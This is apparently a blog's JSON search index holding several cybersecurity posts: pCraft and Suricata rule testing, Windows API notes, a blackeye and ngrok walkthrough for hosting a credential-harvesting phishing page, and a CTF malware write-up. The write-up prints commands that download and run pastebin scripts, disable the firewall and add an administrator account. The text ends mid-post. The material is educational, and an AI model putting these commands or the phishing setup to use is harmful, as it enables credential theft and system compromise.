batch file!\nReferences\n[1] scmagazine: Obfuscation tool ‘BatCloak’ evades 80% of AV engines\r[2] Jose Luis Sánchez Martínez: Using Jlaive to create batch files from .NET assemblies for defense evasion\r[3] Dump-GUY: Get-UnJlaive\r[3] DuMp-GuY TrIcKsTeR: Get-UnJlaive - Jlaive Protector Reconstructor\r","permalink":"http://localhost:1313/posts/jlaive/","summary":"What will this post be about This post will be about the Jlaive and Get-UnJlaive tools. I will not go into depth as there are other resources I will list that do a great job explaining more in depth of the ins and outs of these tools. This will just be an overview of the tools: How to obfuscate an executable with Jlaive and how to recover it using Get-UnJlaive.","title":"Exploring the Jlaive and UnJlaive tool"},{"content":"What is the pCraft tool pCraft is a tool used to generate pcaps based on a scenario written in an ami file. The generated pcap file can then be used for the testing of rules etc.\nInstallation To install the tool, you can either clone it from its github repo:\nhttps://github.com/DevoInc/pCraft or by using docker.\nI had some issues when running the tool from the github repo (dependency errors with the pyami module), so I went with the docker option instead, which is what I will demonstrate.\nIn summary, we need to run the following commands:\n{ \u0026#34;1) systemctl start docker\u0026#34;:\u0026#34;Starts docker\u0026#34;, \u0026#34;2) sudo docker pull sightingdb/pcraft\u0026#34;:\u0026#34;Pulls the docker image of the tool\u0026#34;, \u0026#34;3) docker run --name pcraft -d sightingdb/pcraft\u0026#34;:\u0026#34;Runs the tool\u0026#34;, \u0026#34;4) docker ps -a\u0026#34;:\u0026#34;Finds the ID of the docker process running the tool\u0026#34;, \u0026#34;5) docker exec -it {ID} bash\u0026#34;:\u0026#34;Executes the container in bash (meaning we get a shell inside the docker container)\u0026#34; } After that, we should be inside the docker container and run the tool without any errors:\nbuilder@4079f88d957d:~/pcraft$ ls \u0026#39;#hello.ami#\u0026#39; ami dns.ami parsuricata pyami.cpython-38-x86_64-linux-gnu.so setup.py LICENSE amigraph.py dns.pcap pcraft requirements.txt tests README.md build-pluginsdoc.py doc pcrafter samples tools builder@4079f88d957d:~/pcraft$ ./pcrafter Syntax: ./pcrafter script.ami output.pcap script.ami The .ami file contains actions that will be triggered and displayed inside the generated .pcap file. These actions can contain anything you see on a network traffic, like DNS queries, data being transfered, TCP handshakes etc.\nExample of an ami file An example of a .ami file is the following:\nami_version 1\r$victimip = \u0026#34;192.168.0.55\u0026#34;\r$fakebankip = \u0026#34;185.199.108.153\u0026#34;\raction DnsRequest {\r$ip-src = $victimip\r$ip-dst = $fakebankip\r$domain = \u0026#34;mikrosoft.com\u0026#34;\rexec DNSConnection\r}\raction PostData {\rexec HTTPConnection\r$method = \u0026#34;POST\u0026#34;\r$client-content-type = \u0026#34;application/x-www-form-urlencoded\u0026#34;\r$client-content = \u0026#34;login=Alfred.Wallace@example.com\u0026amp;password=qwerty1234\u0026#34;\r} This will basically trigger a DNS request and the resolved domain will be \u0026ldquo;mikrosoft.com\u0026rdquo; (you could set up a rule to detect such names later as we will see).\nAfterwards, we specify that a PostData action will take place which basically transfers some data - and specifically some user credentials.\nGenerating a pcap file based on an ami scenario Let\u0026rsquo;s see that in action:\nbuilder@4079f88d957d:~/pcraft$ ./pcrafter dns.ami dns.pcap All plugins loaded! Opening Script File dns.ami Executing action DnsRequest using DNSConnection Executing action PostData using HTTPConnection HTTP Method:POST builder@4079f88d957d:~/pcraft$ We copy over to our localhost the dns.pcap to view it in wireshark and then open it:\n┌──(connar㉿kali)-[~/blog/pcraft_tool] └─$ docker cp 4079f88d957d:/home/builder/pcraft/dns.pcap . └─$ wireshark dns.pcap\u0026amp; The result is the following pcap:\n└─$ tshark -r dns.pcap 1 Mar 16, 2024 21:30:18.468122000 EET 192.168.0.55 → 1.1.1.1 DNS 73 Standard query 0x0000 A mikrosoft.com 2 Mar 16, 2024 21:30:18.468536000 EET 1.1.1.1 → 192.168.0.55 DNS 102 Standard query response 0x0000 A mikrosoft.com A 185.199.108.153 3 Mar 16, 2024 21:30:18.469148000 EET 192.168.0.55 → 185.199.108.153 TCP 54 9279 → 80 [SYN] Seq=0 Win=8192 Len=0 4 Mar 16, 2024 21:30:18.469714000 EET 185.199.108.153 → 192.168.0.55 TCP 54 80 → 9279 [SYN, ACK] Seq=0 Ack=0 Win=8192 Len=0 5 Mar 16, 2024 21:30:18.470133000 EET 192.168.0.55 → 185.199.108.153 TCP 54 9279 → 80 [ACK] Seq=1 Ack=0 Win=8192 Len=0 6 Mar 16, 2024 21:30:18.470577000 EET 192.168.0.55 → 185.199.108.153 HTTP 311 POST / HTTP/1.1 (application/x-www-form-urlencoded) 7 Mar 16, 2024 21:30:18.471097000 EET 192.168.0.55 → 185.199.108.153 TCP 54 80 → 9279 [ACK] Seq=1 Ack=1 Win=8192 Len=0 8 Mar 16, 2024 21:30:18.471399000 EET 185.199.108.153 → 192.168.0.55 HTTP 268 HTTP/1.1 200 OK (text/html) Opening it in Wireshark, we get the following:\nNote: We can remove this \u0026lt;html\u0026gt;\u0026lt;body\u0026gt;Hello, you!\u0026lt;/body\u0026gt;\u0026lt;/html\u0026gt; by going to pCraft/build/lib/pcraft/plugins/HTTPConnection.py or generally modifying it to our liking.\rTesting suricata rules on custom pcap As I mentioned earlier, pcraft is a great tool at making your own pcaps and testing rules upon them. In this part of the post, we are going to follow up on the example of the Red Team Village (see references) and create our own suricata rule, ami file and then generate a pcap and use tcpreplay to test if our rule is successful upon the generated custom network file.\nCreate the ami file (newsuricata.ami) The ami file we will use is the following:\nami_version 1\raction TriggerSuricata {\rexec Suricata\r$ip-src = \u0026#34;172.17.0.2\u0026#34;\r$ip-dst = \u0026#34;185.199.108.153\u0026#34;\r$rule = \u0026#34;\u0026#34;\u0026#34;alert dns any any -\u0026gt; any any (msg:\u0026#34;DNS Query GrayHat\u0026#34;; dns_query; content:\u0026#34;grayhat\u0026#34;; nocase; sid:20200809; rev:1;)\u0026#34;\u0026#34;\u0026#34;\r} Just a note here, we see that we exec Suricata. This file contains a domain called \u0026ldquo;GrayHat\u0026rdquo; as we will later see, so it uses this name as the $domain variable.\nCreate the Suricata rule (mydns.rule) The Suricata rule is a very simple one:\nalert dns any any -\u0026gt; any any (msg:\u0026#34;DNS Query Grayhat\u0026#34;; dns_query; content:\u0026#34;grayhat\u0026#34;; nocase; sid:20201020; rev:1;) It basically listens on all interfaces to find a dns query that contains the domain name \u0026ldquo;Grayhat\u0026rdquo;.\nTesting our rule Now that we have both the ami and the rule files ready, let\u0026rsquo;s generate the pcap file like we\u0026rsquo;ve seen previously:\nbuilder@4079f88d957d:~/pcraft$ ./pcrafter newsuricata.ami new.pcap The generated pcap is just a pcap that makes dns queries for the domain \u0026ldquo;Grayhat\u0026rdquo;:\nbuilder@4079f88d957d:~/pcraft$ tshark -r new.pcap 1 0.000000 172.17.0.2 ? 1.1.1.1 DNS 67 Standard query 0x0000 A grayhat 2 0.000409 1.1.1.1 ? 172.17.0.2 DNS 90 Standard query response 0x0000 A grayhat A 185.199.108.153 Now that we have a successfully generated pcap, let\u0026rsquo;s set up a listener with suricata (note that you must run the following as root user):\nroot@4079f88d957d:/home/builder/pcraft# suricata -S mydns.rule -i eth0 17/3/2024 -- 15:22:28 - \u0026lt;Notice\u0026gt; - This is Suricata version 5.0.3 RELEASE running in SYSTEM mode 17/3/2024 -- 15:22:28 - \u0026lt;Warning\u0026gt; - [ERRCODE: SC_ERR_SYSCALL(50)] - Failure when trying to set feature via ioctl for \u0026#39;eth0\u0026#39;: Operation not permitted (1) 17/3/2024 -- 15:22:28 - \u0026lt;Warning\u0026gt; - [ERRCODE: SC_ERR_SYSCALL(50)] - Failure when trying to set feature via ioctl for \u0026#39;eth0\u0026#39;: Operation not permitted (1) 17/3/2024 -- 15:22:28 - \u0026lt;Warning\u0026gt; - [ERRCODE: SC_ERR_SYSCALL(50)] - Failure when trying to set feature via ioctl for \u0026#39;eth0\u0026#39;: Operation not permitted (1) 17/3/2024 -- 15:22:28 - \u0026lt;Notice\u0026gt; - all 5 packet processing threads, 4 management threads initialized, engine started Then, we can just use tcpreplay with our previously generated pcap to replicate the traffic:\nbuilder@4079f88d957d:~/pcraft$ tcpreplay -i eth0 new.pcap Warning in interface.c:get_interface_list() line 93: May need to run as root to get access to all network interfaces. Fatal Error in sendpacket.c:sendpacket_open() line 544: failed to open device eth0: socket: Operation not permitted builder@4079f88d957d:~/pcraft$ sudo tcpreplay -i eth0 new.pcap Actual: 2 packets (157 bytes) sent in 0.000455 seconds Rated: 345054.9 Bps, 2.76 Mbps, 4395.60 pps Flows: 2 flows, 4395.60 fps, 2 flow packets, 0 non-flow Statistics for network device: eth0 Successful packets: 2 Failed packets: 0 Truncated packets: 0 Retried packets (ENOBUFS): 0 Retried packets (EAGAIN): 0 Now, moment of truth! Let\u0026rsquo;s see what has been written on /var/log/suricata/fast.log which basically contains alerts that get triggered based on matching suricata rules.\nroot@4079f88d957d:/home/builder/pcraft# cat /var/log/suricata/fast.log 03/17/2024-15:23:28.882746 [**] [1:20201020:1] DNS Query Grayhat [**] [Classification: (null)] [Priority: 3] {UDP} 172.17.0.2:4096 -\u0026gt; 1.1.1.1:53 Aaaaaand we got a successful alert! Isn\u0026rsquo;t this great?\npCraft seems like a great tool to play around and dive deeper into rules and custom traffic. I will definitely use this tool for training and maybe I\u0026rsquo;ll come back in the future with an extensive senario to take a look together.\nUntil next time everyone!\nReferences\n[1] Sans Technology Institute: Generating PCAP Files from YAML\r[2] github: pCraft repo\r[3] Red Team Village: Attacking Networks with pCraft\r","permalink":"http://localhost:1313/posts/pcraft/","summary":"What is the pCraft tool pCraft is a tool used to generate pcaps based on a scenario written in an ami file. The generated pcap file can then be used for the testing of rules etc.\nInstallation To install the tool, you can either clone it from its github repo:\nhttps://github.com/DevoInc/pCraft or by using docker.\nI had some issues when running the tool from the github repo (dependency errors with the pyami module), so I went with the docker option instead, which is what I will demonstrate.","title":"Exploring the pCraft tool"},{"content":"Intro As I am starting to take a turn of interest into malware analysis and development, I was required to understand what the Windows API really is. So this post is basically my notes on what windows api is and a few examples of it.\nWas exactly is an API When you use a Windows application, have you ever wondered how it seamlessly interacts with the operating system? The magic behind this interaction is the Windows API. Generally, an api allows for two pieces of software to interact upon another. When it comes to programming, it allows your code to interact with the windows operating system.\nLet\u0026rsquo;s dive into what the Windows API is and why it\u0026rsquo;s crucial for software development on the Windows platform - but also for red teamers, threat actors and blue teamers as well.\nThe functionality of the Windows API The Windows API, or Windows Application Programming Interface, is an extensive collection of functions and procedures supplied by the Microsoft Windows operating system that utilizes memory addresses to access resources, manage memory, pass parameters to methods and much more. Imagine it as a toolkit that enables software developers to build applications capable of interacting with the Windows environment. For instance, tasks such as displaying content on the screen, modifying files, or querying the registry can all be accomplished through the Windows API. Microsoft provides thorough documentation for the Windows API, which you can explore here.\nBasically, when an application needs to perform an operation, it uses the Win32 API, which translates the request into SYSCALLs. These SYSCALLs are then executed by the kernel to make the necessary changes or perform the desired actions. We can see an overview of this process in the following diagram:\nMore specifically and for giving an example, the function flow of the calls made by a program that just wants to use the FileStream.Read method would be the following:\nWindows Jobs A Windows Job is directly supported by the Windows API through functions that allow you to create, manage, and monitor job objects. These job objects are part of the Windows OS\u0026rsquo;s resource management capabilities. In simpler terms, a job is a kernel object that is responsible for managing one or more processes that run on the system. Functions like CreateJobObject and OpenJobObject are part of the Windows API and provide the necessary tools to implement job management.\nCreateJobObject: This function is part of the Windows API and is used to create a job object. It provides a handle to the newly created job object, which can then be used with other job management functions: HANDLE hJob = CreateJobObject(NULL, TEXT(\u0026#34;ExampleJob\u0026#34;)); if (hJob == NULL) { // Handle error } OpenJobObject: This function is part of the Windows API and allows you to open an existing job object by name. It returns a handle to the job object, enabling further manipulation or querying: HANDLE hJob = OpenJobObject(JOB_OBJECT_ALL_ACCESS, FALSE, TEXT(\u0026#34;ExampleJob\u0026#34;)); if (hJob == NULL) { // Handle error } AssignProcessToJobObject: This function assigns a process to a job object. The process will then be subject to the limits and rules of the job object: #include \u0026lt;windows.h\u0026gt; #include \u0026lt;stdio.h\u0026gt; int main() { // Create a job object HANDLE hJob = CreateJobObject(NULL, TEXT(\u0026#34;ExampleJob\u0026#34;)); if (hJob == NULL) { printf(\u0026#34;CreateJobObject failed with error: %lu\\n\u0026#34;, GetLastError()); return 1; } // Create a process to assign to the job object STARTUPINFO si; PROCESS_INFORMATION pi; ZeroMemory(\u0026amp;si, sizeof(si)); si.cb = sizeof(si); ZeroMemory(\u0026amp;pi, sizeof(pi)); if (!CreateProcess(NULL, TEXT(\u0026#34;notepad.exe\u0026#34;), NULL, NULL, FALSE, 0, NULL, NULL, \u0026amp;si, \u0026amp;pi)) { printf(\u0026#34;CreateProcess failed with error: %lu\\n\u0026#34;, GetLastError()); CloseHandle(hJob); return 1; } // Assign the process to the job object if (!AssignProcessToJobObject(hJob, pi.hProcess)) { printf(\u0026#34;AssignProcessToJobObject failed with error: %lu\\n\u0026#34;, GetLastError()); CloseHandle(pi.hProcess); CloseHandle(pi.hThread); CloseHandle(hJob); return 1; } printf(\u0026#34;Process assigned to job object successfully.\\n\u0026#34;); // Wait for the process to exit WaitForSingleObject(pi.hProcess, INFINITE); // Clean up handles CloseHandle(pi.hProcess); CloseHandle(pi.hThread); CloseHandle(hJob); return 0; } Layers of the Windows API Before we dive into the functionality of the API, it\u0026rsquo;s important to understand the layers and terminologies we\u0026rsquo;ll be referring to. The Win32 API, more commonly known as the Windows API, consists of several components that define its structure and organization. To simplify this, we\u0026rsquo;ll break down the Win32 API using a top-down approach: the API itself is the top layer, and the parameters for specific calls are the bottom layer. The table below outlines this top-down structure at a high level, with more detailed explanations to follow:\nHeader files vs Dll files Header files Header files contain definitions of functions that make up the API, such as ReadProcessMemory, but they do not include the actual code that implements these functions:\n#include \u0026lt;windows.h\u0026gt; #include \u0026lt;iostream\u0026gt; int main() { // Open the process with PROCESS_VM_READ access DWORD processID = 1234; // Replace with the target process ID HANDLE hProcess = OpenProcess(PROCESS_VM_READ, FALSE, processID); if (hProcess == NULL) { std::cerr \u0026lt;\u0026lt; \u0026#34;Failed to open process. Error: \u0026#34; \u0026lt;\u0026lt; GetLastError() \u0026lt;\u0026lt; std::endl; return 1; } // Address in the target process to read from LPCVOID baseAddress = (LPCVOID)0x7FF6ABCDEF00; // Replace with the actual address SIZE_T bytesRead; char buffer[256]; // Buffer to store the read data // Read memory from the target process if (ReadProcessMemory(hProcess, baseAddress, buffer, sizeof(buffer), \u0026amp;bytesRead)) { std::cout \u0026lt;\u0026lt; \u0026#34;Read \u0026#34; \u0026lt;\u0026lt; bytesRead \u0026lt;\u0026lt; \u0026#34; bytes from the process.\u0026#34; \u0026lt;\u0026lt; std::endl; // Do something with the data in buffer } else { std::cerr \u0026lt;\u0026lt; \u0026#34;Failed to read process memory. Error: \u0026#34; \u0026lt;\u0026lt; GetLastError() \u0026lt;\u0026lt; std::endl; } // Close the handle to the process CloseHandle(hProcess); return 0; } Here, we imported the windows.h header file that contains the declarations for all the Windows API functions, including ReadProcessMemory.\nThe implementation code is found in DLL files, which stands for Dynamic Link Libraries. A single DLL file can provide the implementations for multiple header files.\nSo basically, the windows.h header file includes, amongst others, the declaration of the ReadProcessMemory function:\nBOOL ReadProcessMemory( HANDLE hProcess, LPCVOID lpBaseAddress, LPVOID lpBuffer, SIZE_T nSize, SIZE_T *lpNumberOfBytesRead ); This declaration tells the compiler what the function looks like, its name, return type, and parameters. However, it does not provide the actual implementation of the function. The code of this function is inside the corresponding dll.\nDll files When a function like ReadProcessMemory is called, the system locates the corresponding DLL that contains the implementation of this function. For many Windows API functions, this DLL is kernel32.dll. How is the header file connected with the dll and the function name call is described below:\nLinking Process Compilation: During the compilation, the compiler uses the header files to understand the structure and usage of the functions. It ensures that the function calls in our code match the declarations in the header files. Linking: During the linking phase, the linker resolves the references to these functions by linking them to the corresponding DLL files that contain the actual implementation. For ReadProcessMemory, the linker ensures that the call in our code will be linked to the kernel32.dll. Runtime: At runtime, when the program execution reaches a call to ReadProcessMemory, the Windows operating system loads kernel32.dll (if it is not already loaded) and resolves the address of the ReadProcessMemory function. The program then jumps to that address to execute the function. So when our previous code calls the ReadProcessMemory, the process that happens can be summorized as:\nInclude Header File: You include windows.h in your source file. This header file contains the declaration of ReadProcessMemory: #include \u0026lt;windows.h\u0026gt; Link to DLL: The linker ensures that your program is linked with kernel32.dll, where ReadProcessMemory is implemented. Call the Function: When you call ReadProcessMemory in your code, the compiled program contains a placeholder that will be resolved to the actual address of the function in kernel32.dll at runtime: if (ReadProcessMemory(hProcess, baseAddress, buffer, sizeof(buffer), \u0026amp;bytesRead)) { // Successfully read memory } Execution: At runtime, when ReadProcessMemory is called, the operating system ensures that kernel32.dll is loaded into memory, finds the ReadProcessMemory function within the DLL, and executes it. Windows data types Windows data types and conventions refer to the specific data types and coding conventions used in Windows programming. These conventions are established by Microsoft to ensure consistency and compatibility across Windows applications. Here\u0026rsquo;s a breakdown of some key aspects:\nData Types: Basic Data Types: Windows programming uses basic data types like int, char, float, etc., similar to standard C and C++ programming. Platform-Specific Data Types: Windows also defines its own data types, often prefixed with DWORD, LP, HANDLE, etc. These data types are designed to accommodate various platform-specific requirements, such as memory management, inter-process communication, and file handling. Unicode Support: Windows APIs often use Unicode for text manipulation. As a result, data types like wchar_t (wide character) and functions prefixed with W (e.g., CreateWindowW) are commonly used to support Unicode strings. Pointer Types: Windows APIs use pointer types like LPVOID (pointer to void), LPCSTR (pointer to constant string), LPWSTR (pointer to wide string), etc., for memory management and passing parameters. Conventions: Naming Conventions: Windows APIs and data types typically follow a consistent naming convention. For example, function names often start with a capital letter (e.g., CreateWindow) and use CamelCase. Constants are often named in uppercase (e.g., HWND_TOPMOST). Error Handling: Windows APIs often use error codes, typically represented as DWORD values, to indicate the success or failure of operations. Functions usually return BOOL values (TRUE for success, FALSE for failure) or specific error codes (e.g., ERROR_SUCCESS, ERROR_FILE_NOT_FOUND). Function naming conventions Many times you will come upon function that generally look the same, but usually they will have a suffix to them. For example:\nFunction() // This is the generic name and is compatible with both ANSI and Unicode encodings FunctionA() // Indicates ANSI encoding FunctionW() // Indicates Unicode encoding You will also come across other functions with the suffix Ex like FunctionEx() which stands for extended. So a function ending with Ex provides extended control over the execution of a specific task:\nThere are many other different function naming conventions that are less straight forward like:\nNtCreateFile() GetFileAttributesExA() but their use can be matched to the components to which the function belongs with the help of the following table: Demo 1 - Viewing the API calls from python We are now going to use python to open a file with write permissions and monitor the journey of the calls being made to the system.\nStep 1 - Open python To start of, we need to open a python terminal and write the following line:\n\u0026gt;\u0026gt;\u0026gt; open(\u0026#34;C:\\\\Users\\\\connar\\\\Desktop\\\\proof_of_concept.txt\u0026#34;, \u0026#34;w\u0026#34;) Before running this line, let\u0026rsquo;s open WinDbg and attach the python process to it.\nStep 2 - Attaching python process to WinDbg To attach the python process to WinDbg, simply go to File \u0026ndash;\u0026gt; Attach to Process \u0026ndash;\u0026gt; Double click python process.\nStep 3 - Putting a breakpoint at CreateFileW Because python uses CreateFileW (the Unicode version as we previously discussed) to write to files, we need to breakpoint the calls being made to CreateFileW:\nWe can see that after breakpointing the calls to CreateFileW, resuming the process and running it, we got a hit on KERNELBASE!CreateFileW. The reason its KERNELBASE and not KERNEL32 is that Microsoft at some point decided to move part of functionality of KERNEL32 to KERNELBASE.\nNow, remember that we previously mentioned Win32 API uses memory addresses? Let\u0026rsquo;s view the contents of the rcx register by using the display unicode command:\nAaand we got the parameter given to our open() python function, or in other words the CreateFileW method:\nHANDLE CreateFileW( [in] LPCWSTR lpFileName, \u0026lt;-- First parameter is the filename [in] DWORD dwDesiredAccess, [in] DWORD dwShareMode, [in, optional] LPSECURITY_ATTRIBUTES lpSecurityAttributes, [in] DWORD dwCreationDisposition, [in] DWORD dwFlagsAndAttributes, [in, optional] HANDLE hTemplateFile ); In this simple example, we got a general idea of how a simple script that on the outside seems to just use the open() function, ended up calling CreateFileW and passing as argument (found in the rcx) the first parameter that CreateFileW accepts, which is the name of the file we are trying to open.\nThis is more or less what is happening behind the scenes when we call functions on our programs. WinAPI calls the corresponding dll\u0026rsquo;s to take care of the task and communicate with the kernel.\nDemo 2 - Viewing the API calls from notepad.exe In the previous demo we saw the series of calls that happened in Windows API when we tried to write to a file using a python script, with the help of WinDbg.\nIn this demo we are about to see the same thing but for notepad.exe this time and also by using a different program named ApiMonitor.\nApiMonitor is a tool used to \u0026hellip; well, monitor API calls being made by applications.\nUpon downloading and opening it, we need to find the following three API calls and check them:\nKernel32!CreateFileA Kernel32!CreateFileW ntdll!NtCreateFile These are some of the most popular API calls that usually happen when trying to create a file, so we will check them in order to only monitor them. To check them, you need to navigate to the \u0026ldquo;API Filter\u0026rdquo; pane, click display and then CTRL+F searching for the name \u0026ldquo;CreateFile\u0026rdquo;:\nAfter we have checked the mentioned three API calls, let\u0026rsquo;s monitor the notepad.exe process by navigating to File\u0026ndash;\u0026gt;Monitor New Process\u0026hellip; and then finding the notepad.exe:\nNote that if you don\u0026rsquo;t have a file named \u0026ldquo;filetest.txt\u0026rdquo;, the program will create it for you.\nWe can now see the API calls that notepad.exe made. We can view more info about one of those calls - such as the parameters used - by clicking one of them:\nWhat we can tell from the parameters is that they exactly match the structure of the CreateFileW we saw earlier. Another thing we can note by also looking back at a previous image, is that CreateFileW was made by user mode and ended up being executed by the kernel mode, thus the extra call to NtCreateFile (which comes from NtDll).\nReferences\n[1] Guided Hacking: What is the Windows API? What is Windows.h?\r[2] Nir Lichtman: How Windows API Works Under the Hood\r[3] Kavishka Gihan: Introduction to Windows API\r[3] PMA 403. API Monitor\r[4] Pavel Yosifovich: Windows Internals for .NET Developers\r","permalink":"http://localhost:1313/posts/windowsapi/","summary":"Intro As I am starting to take a turn of interest into malware analysis and development, I was required to understand what the Windows API really is. So this post is basically my notes on what windows api is and a few examples of it.\nWas exactly is an API When you use a Windows application, have you ever wondered how it seamlessly interacts with the operating system? The magic behind this interaction is the Windows API.","title":"Learning about Windows API"},{"content":"Intro In this post we are going to see how to make a phishing website to then use for other attacks such as the Browser-in-the-Browser attack ( see: BitB ).\nThere are plenty of tools out there to quickly set up a phishing website. For example:\nSocialphish Shell Phish Zphisher Blackeye and plenty others, but also platforms like gophish.\nI just happened to be reading something about Blackeye tool, so we\u0026rsquo;ll go with this option. Setup of blackeye Its very quick and easy to set up blackeye. All you have to do is the following:\n┌──(connar㉿kali)-[~/blog/black_eye_tool] └─$ git clone https://github.com/EricksonAtHome/blackeye.git Cloning into \u0026#39;blackeye\u0026#39;... remote: Enumerating objects: 305, done. remote: Counting objects: 100% (161/161), done. remote: Compressing objects: 100% (119/119), done. remote: Total 305 (delta 68), reused 127 (delta 38), pack-reused 144 Receiving objects: 100% (305/305), 2.68 MiB | 1.73 MiB/s, done. Resolving deltas: 100% (92/92), done. ┌──(connar㉿kali)-[~/blog/black_eye_tool] └─$ cd blackeye ┌──(connar㉿kali)-[~/blog/black_eye_tool/blackeye] └─$ ./blackeye.sh :: Disclaimer: Developers assume no liability and are not :: :: responsible for any misuse or damage caused by BlackEye. :: :: Only use for educational purporses!! :: :: BLACKEYE By @EricksonAtHome :: [01] Instagram [17] DropBox [33] eBay [02] Facebook [18] Line [34] Amazon [03] Snapchat [19] Shopify [35] iCloud [04] Twitter [20] Messenger [36] Spotify [05] Github [21] GitLab [37] Netflix [06] Google [22] Twitch [38] Reddit [07] Origin [23] MySpace [39] StackOverflow [08] Yahoo [24] Badoo [40] Custom [09] Linkedin [25] VK [10] Protonmail [26] Yandex [11] Wordpress [27] devianART [12] Microsoft [28] Wi-Fi [13] IGFollowers [29] PayPal [14] Pinterest [30] Steam [15] Apple ID [31] Tiktok [16] Verizon [32] Playstation ┌─[ Choose an option:]─[~] └──╼ ~ 34 1.Ngrok 2.Localtunnel To continue, we need to set Ngrok server. We can download the binary from the ngrok website. Afterwards, we need to do the following steps:\n└─$ sudo tar xvzf ngrok-v3-stable-linux-amd64.tgz └─$ sudo mv ngrok /usr/local/bin The final step is to set your auth token which can be found by making an account on the ngrok dashboard. There, you will find your auth token and then can do the last step, which is:\n└─$ ngrok config add-authtoken [your_auth_token] We can now switch back to blackeye and choose option 1:\n─[ Choose the tunneling method:]─[~] └──╼ ~ 1 [*] Starting php server... [*] Starting ngrok server... [*] Send this link to the Victim: [*] Use shortened link instead: [*] Waiting victim open the link ... To get the link, we have to run the ngrok binary we previously downloaded. The port it runs on is 5555 by default and can be found inside its code (and edited of course to listen to some other port like 8080):\n└─$ ngrok http 5555 ngrok (Ctrl+C to quit) Take our ngrok in production survey! https://forms.gle/[redacted] Session Status online Account [redacted] (Plan: Free) Version 3.8.0 Region [redacted] ([redacted]) Latency 362ms Web Interface http://127.0.0.1:4040 Forwarding https://[redacted].ngrok-free.app -\u0026gt; http://localhost:5555 Connections ttl opn rt1 rt5 p50 p90 0 0 0.00 0.00 0.00 0.00 Now that the server is running our phishing amazon site, let\u0026rsquo;s head back to blackeye:\n[*] Waiting victim open the link ... [*] IP Found! [*] IPv6: [redacted] [*] User-Agent: [redacted] [*] Country: [redacted] [*] Region: [redacted] [*] City: [redacted] [*] Postal: [redacted] [*] Location: [redacted] [*] Maps: [redacted] [*] ISP: [redacted] [*] Timezone: [redacted] [*] Saved: amazon/saved.ip.txt [*] Waiting credentials ... Visiting the url provided in the running ngrok instance, we are met with the following website:\nWe provide some rogue credentials and we have our result: ","permalink":"http://localhost:1313/posts/phishingsite/","summary":"Intro In this post we are going to see how to make a phishing website to then use for other attacks such as the Browser-in-the-Browser attack ( see: BitB ).\nThere are plenty of tools out there to quickly set up a phishing website. For example:\nSocialphish Shell Phish Zphisher Blackeye and plenty others, but also platforms like gophish.\nI just happened to be reading something about Blackeye tool, so we\u0026rsquo;ll go with this option.","title":"Setting up a phishing site [using blackeye tool]"},{"content":"","permalink":"http://localhost:1313/posts/insideapefile/","summary":"","title":""},{"content":" connar@localhost:~$ whoami { \u0026#34;Name\u0026#34;:\u0026#34;Connar\u0026#34;, \u0026#34;Location\u0026#34;:\u0026#34;Somewhere in Europe\u0026#34;, \u0026#34;Interests\u0026#34;:[ \u0026#34;Forensics\u0026#34;, \u0026#34;Malware Analysis\u0026#34;, \u0026#34;Maldev\u0026#34;, \u0026#34;Cryptography\u0026#34;, \u0026#34;Reverse Engineering\u0026#34;, \u0026#34;Security in general\u0026#34; ], \u0026#34;Age\u0026#34;:\u0026#34;22\u0026#34; } Hi! Im connar. Im 22 and I am learning various cybersecurity topics and experimenting with different random tools I stumble upon.\nI am mainly into malware stuff (analysis and dev) but also into forensics. To be honest, I am no expert, but I am trying to apply the Feynman\u0026rsquo;s technique which helps me a lot to memorize and better understand the stuff I am learning (thus, this blog).\nI also really like making CTF challenges, some of which you are going to see here in this blog:)\nThis is basically a journal into my journey into cybersecurity, keeping track of what I have learned and stuff that may seem useful to any of you that are reading it. Obviously, my posts and things I read from other authors and just try to try them myself, so credits go to them:)\nThat\u0026rsquo;s a wrap I think. Hope you stick around, have fun:)\n","permalink":"http://localhost:1313/about/","summary":"about","title":"About"},{"content":"Starting the analysis In this challenge we are provided with a .rar file. We can extract the following files from this archive:\nAn image named “SantasVillage.png” A txt named “RecipeForClassicBreadStuffing.txt” If we pay attention to the txt file, we will notice that it is actually a vbs script. If we open it and view its contents we are met with the following code: What this script is doing is:\nOpen a website with recipe instructions. Try to craft the path for the png image. Try and execute a script named herfxmasgiftfreh.cmd found inside an ADS stream of the png file. This should raise some alarms about the script inside the ADS stream of the png image, so let’s start analyzing it. To get the contents of the hidden script inside the ADS stream, we can run the following command: After running the command “Get-Content –Path .\\VillageOfSanta.png -Stream herfxmasgiftfreh.cmd” we get the embedded .cmd script that seems to be obfuscated. Let’s save it to a separate file and start deobfuscating it.\nDeobfuscation The method of obfuscation here is called envar obfuscation. Basically the malware creates a set of characters and creates the code to be executed by taking individual characters from the defined list:\nAfter we are done deobfuscating the script (by replacing each expression with the corresponding character), we are met with the following script:\nThe script has a lot going on, but we should pay attention to only 3 suspicious parts. The first one is the one where the script tries to download a .bat file from Pastebin and then run it:\nnetsh firewall set opmode mode-disable powershell -command \u0026#34;Invoke-Webrequest https://pastebin.com/raw/bLnD8FWX -outfile KillAVS.bat\u0026#34; start KillAVS.bat If we visit this url, we are met with another obfuscated script:\nUpon deobfuscating it with the same method used previously, we end up with the following deobfuscated script:\nThis tried to stop all possible AV engines that may be installed on the system. Really interesting, but no flag here, so let’s move to the second suspicious url:\ncls powershell -Command \u0026#34;Invoke-WebRequest https://pastebin.com/raw/ptkj3Ua5 -outFile ycynlog.cmd\u0026#34; start /min ycynlog.cmd As before, another obfuscated script can be found by visiting the url:\nDeobfuscating once again the script with the same methodology, we end up with:\nAnother file being dropped… But this time its an executable. Maybe this is the end? Visiting the rentry link we end up with some hex values that match the header of an executable:\nThe script itself tries to decode them and save the bytes to an executable, so we should try and do the same. We can use cyberchef for that:\nSaving them as an .exe and opening the executable in IDA, we are met with the following contents:\nAfter looking around a bit in the functions, we are finally met with the flag:\nUINT AddUser() { WinExec( \u0026#34;cmd.exe /c net user System_guest NHACK{4_7h3_23c02d_7h15_w45_4n_4c7u4l_m4lw4r3_54mpl3_s0_c0n92475!!} /add\u0026#34;; 0); return WinExec(\u0026#34;cmd.exe /c net localgroup administrators System_guest /add\u0026#34;; 0); } ","permalink":"http://localhost:1313/ctfwriteups/anemailfromauntchloe/","summary":"Starting the analysis In this challenge we are provided with a .rar file. We can extract the following files from this archive:\nAn image named “SantasVillage.png” A txt named “RecipeForClassicBreadStuffing.txt” If we pay attention to the txt file, we will notice that it is actually a vbs script. If we open it and view its contents we are met with the following code: What this script is doing is:\nOpen a website with recipe instructions.","title":"An email from aunt Chloe - Writeup"},{"content":"This is a ‘secret password’ type of challenge, where we need to somehow reverse engineer the given executable and find the correct password:\nAfter the final wrong attempt, the executable closes:\nSo how can we find 